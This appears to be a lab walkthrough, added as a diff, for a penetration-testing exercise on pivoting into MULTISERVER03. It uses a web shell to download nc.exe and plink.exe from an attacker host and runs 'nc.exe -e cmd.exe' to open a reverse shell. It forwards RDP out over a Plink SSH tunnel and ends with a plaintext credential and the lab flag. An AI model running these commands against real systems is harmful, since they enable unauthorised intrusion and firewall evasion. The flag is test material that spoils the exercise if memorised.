@@ -1,0 +1,60 @@
+Questions
+Follow the steps in this section to gain an RDP connection to MULTISERVER03. What's the flag found in flag.txt file on the rdp_admin's desktop?
+
+Background: Administrators may want to avoid leaving OpenSSH on their Windows machines, so we're not guaranteed to discover an OpenSSH client. Even if we find ourselves on a recent version of Windows, the network administrators may have removed it.
+
+# Nevertheless, network administrators still need remote administration tools. Most networks have SSH servers running somewhere, and administrators need tools to connect to these servers from Windows hosts. Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were PuTTY1 and its command-line-only counterpart, Plink.
+
+# We'll use Plink in this section, since in a security assessment, we will more likely have a shell than GUI access.
+
+# In this scenario, we find that MULTISERVER03 now has a web application on TCP port 80 exposed. All other inbound ports are blocked by a firewall, so RDP is no longer available either.
+
+# We can compromise MULTISERVER03 through the web application, drop a web shell on it, and gain a reverse shell using that
+
+# First, we will get an interactive reverse shell from MULTISERVER03. From our initial exploitation, we uploaded a basic web shell at /umbraco/forms.aspx.
+
+# To download nc.exe onto MULTISERVER03, we first need to host it on a server that MULTISERVER03 can access
+python3 -m http.server 80
+
+# Get the nc.exe
+find / -name nc.exe 2>/dev/null
+cp /usr/share/windows-resources/binaries/nc.exe . 
+chmod 755 nc.exe
+
+# We will use a PowerShell wget one-liner from our web shell to download nc.exe. 
+http://192.168.180.64/umbraco/forms.aspx # A webshell that had been uploaded
+
+# Execute the command below
+powershell wget -Uri http://192.168.45.237/nc.exe -OutFile C:\Windows\Temp\nc.exe
+...
+192.168.180.64 - - [05/May/2024 02:49:23] "GET /nc.exe HTTP/1.1" 200 -
+...
+
+# HTTP results show nc.exe had been successfully obtain by victim
+# Prepare to listen using MSFConsole to 4444
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.237 4444
+
+# After access to the MULTISERVER03, we now want to download Plink. Go to KALI
+find / -name plink.exe 2>/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+
+cp /usr/share/windows-resources/binaries/plink.exe .  
+chmod 755 plink.exe
+
+# Upload the plink tools
+c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.237/plink.exe -Outfile C:\Windows\Temp\plink.exe
+
+# Set up Plink with a remote port forward so that we can access the MULTISERVER03 RDP port from our Kali machine
+c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.237
+
+# By successful, it will ssh to kali machine, Lets check on KALI is the 9833 opened
+ss -tulpn
+...
+tcp    LISTEN  0       128          127.0.0.1:9833           0.0.0.0:*      users:(("sshd",pid=156073,fd=7)) 
+...
+
+# Now we can try to RDP into the machine
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+
+# Capture the flag from user desktop
+OS{a2ad731d893947beb39634ed54dbd3cd}
